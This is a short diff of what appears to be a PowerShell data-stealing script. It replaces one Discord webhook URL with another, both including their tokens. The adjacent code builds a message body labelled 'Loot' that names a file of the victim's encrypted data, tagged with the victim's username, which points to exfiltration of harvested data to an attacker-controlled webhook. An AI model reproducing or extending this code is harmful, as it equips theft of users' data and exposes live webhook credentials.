@@ -98,7 +98,7 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-$hookurl = 'https://discord.com/api/webhooks/1428302116455186532/dOdkUVnlx0Av1blb5VRDr4-JrUH_Hdta2cTM6m7HJ1oHPV1Mc2DfFwd6x3b1WT0_Gfzp'
+$hookurl = 'https://discord.com/api/webhooks/1428300221351333921/9FBZDxhjNaP-NgNRbYTznV_sRUOxdkGeXteVHRMi55uuKSfQZRpDzM4Qfg47XHohjb1W'
 $Body = @{
   'Loot' = "$($env:USERNAME)_EncryptedData.txt"
   'content' = $text
